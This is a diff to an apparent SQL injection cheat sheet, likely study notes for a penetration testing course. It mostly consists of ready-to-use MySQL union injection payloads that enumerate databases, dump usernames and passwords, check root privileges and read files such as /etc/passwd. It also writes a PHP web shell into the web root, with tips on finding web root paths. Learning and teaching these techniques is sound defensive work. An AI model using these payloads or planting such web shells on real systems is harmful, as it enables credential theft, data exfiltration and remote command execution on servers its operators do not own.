@@ -154,7 +154,7 @@ MySQL evaluates AND before OR, so a query with an OR and a TRUE condition (e.g.,
 
 [Payload all the things: authentication bypass section](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
 
-**Note:**  Line comments with -- or #, in-line comment with /**/.
+**Note:**  Line comments with `--` or `#`, in-line comment with `/**/`.
 
 ### Union Injection
 
@@ -180,8 +180,8 @@ MySQL evaluates AND before OR, so a query with an OR and a TRUE condition (e.g.,
 
 | Payload | Description |
 |---------|-------------|
-| `cn' UNION select 1,database(),2,3-- -` | Current database name  |
-| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
+| `cn' UNION select 1,database(),3,4-- -` | Current database name  |
+| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases (mysql, information_schema and performance_schema are default MySQLdatabases ) |
 | `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
 | `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
 | `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
@@ -190,15 +190,26 @@ MySQL evaluates AND before OR, so a query with an OR and a TRUE condition (e.g.,
 
 | Payload | Description |
 |---------|-------------|
-| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
-| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
-| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Find if all user privileges |
-| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
+| `cn' UNION SELECT 1, user(), 3, 4-- -` or `cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -` | Find current user |
+| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if "root" user has admin privileges |
+| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Show all of the "root" user's privileges, "FILE" privilege allows the user to read files |
+| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL. If "variable_value" is empty then we can read/write files to any location |
+
+#### Write File Privileges
+
+To be able to write files to the back-end server using a MySQL database, we require three things:
+
+- User with FILE privilege enabled
+- MySQL global secure_file_priv variable not enabled
+- Write access to the location we want to write to on the back-end server
 
 ### File Injection
 
 | Payload | Description |
 |---------|-------------|
 | `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
-| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
-| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
+| `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -` | Another read local file example, useful to see how backend queries are handled |
+| `cn' UNION select 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -` | Write a string to a local file |
+| `cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
+
+**Note:** Web shells must be written to the base web directory for the web server (i.e. web root). Use load_file to read the server configuration at /etc/apache2/apache2.conf, /etc/nginx/nginx.conf or %WinDir%\System32\Inetsrv\Config\ApplicationHost.config are a few examples. Could also run a fuzzing scan and try to write files to different possible web roots, using [Linux wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [Windows wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). We can also use server errors to possibly display the web root.
